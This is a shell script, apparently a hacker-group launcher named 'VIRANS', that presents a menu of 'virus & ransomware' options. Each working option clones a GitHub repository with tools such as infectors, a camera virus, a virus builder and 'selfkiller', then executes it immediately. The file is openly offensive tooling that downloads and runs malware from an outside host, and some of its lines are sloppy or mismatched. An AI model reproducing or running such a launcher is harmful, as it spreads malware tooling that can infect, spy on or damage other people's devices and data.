#!/bin/sh
# by noname

cyan='\033[36;1m'
red='\033[31;1m'
blue='\033[34;1m'
white='\033[37;1m'
yellow='\033[33;1m'
green='\033[32;1m'
clear
sleep 1
cowsay -f dragon "VIRUS メ RANSOMWARE"
figlet -f shadow "NONAME-ID"
echo $blue
echo
echo "+ -- --=>[ VIRANS v1 by     ｟ NONAME ｠                ]"
echo $green
echo "+ -- --=>[ 14 Exploits - 10 Scanners 16 post - 38 virus ]"
echo $yellow
echo "+ -- --=>[ Team: EXORCIST ASSOCIATION                   ]"
echo $cyan
echo "+ -- --=>[ Report Bug On WhatsApp : +6281219197281      ]"
echo
echo $red
echo "〔 write virus / ransomware for open the main menu 〕"
echo $white
read -p "root@virans -->>> " virus / ransomware
clear
sleep 1
echo $red
figlet -f shadow "VIRUS & RANSOMWARE"
echo
echo $blue
echo
echo "+ -- --=>[ VIRANS v1 by     ｟ NONAME ｠                ]"
echo $green
echo "+ -- --=>[ 14 Exploits - 10 Scanners 16 post - 38 virus ]"
echo $yellow
echo "+ -- --=>[ Team: EXORCIST ASSOCIATION                   ]"
echo $cyan
echo "+ -- --=>[ Report Bug On WhatsApp : +6281219197281      ]"
echo
echo $blue
echo "Select virus & ransomware below this"
echo
echo $red
echo "1) Infect               5) Virus-Builder"
echo
echo "2) HXP-Ducky            6) Selfkiller"
echo
echo $white
echo "3) SPYBOMB              7) Trojan"
echo
echo "4) Cam-Virus            8) Coming Soon!"
echo
echo $blue
read -p "root@virans -->>> " virus
if [ $virus = 1 ]
then
clear
sleep 1
echo $green
figlet -f shadow "Infect"
git clone https://github.com/noob-hackers/infect
cd infect
bash infect.sh
fi
if [ $virus = 2 ]
then
clear
sleep 1
figlet -f shadow "HXP-Ducky"
git clone https://github.com/hackerxphantom/HXP-Ducky.git
cd HXP-Ducky
bash hxp_ducky.sh
fi
if [ $virus = 3 ]
then
clear
sleep 1
echo $white
figlet -f shadow "SPYBOMB"
git clone https://github.com/BYTEHACKING-CREATIVE/SPYBOMB.git
cd SPYBOMB
bash spybomb.sh
fi
if [ $virus = 4 ]
then
clear
sleep 1
echo $yellow
git clone https://github.com/U7P4L-IN/Cam-Virus.git
cd Cam-Virus
bash cam.sh
fi
if [ $virus = 5 ]
then
clear
sleep 1
toilet -f big -F border -F metal CAM-VIRUS
git clone https://github.com/Cyber-Dioxide/Virus-Builder.git
cd Virus-Builder
pip2 install requests
pip2 install colorama
python3 Builder.py
fi
if [ $virus = 6 ]
then
clear
sleep 1
echo $red
figlet -f shadow Selfkiller
git clone https://github.com/GH05T-HUNTER5/selfkiller.git
cd selfkiller
pip2 install requests
python2 selfkiller
fi
if [ $virus = 7 ]
then
clear
sleep 1
echo $white
figlet -f shadow This tool is not available at this moment
echo $yellow
echo "[-] exiting"
fi
if [ $virus = 8 ]
then
clear
sleep 1
echo $red
figlet -f shadow This Tools Is Coming Soon!
echo "exit code : 404"
fi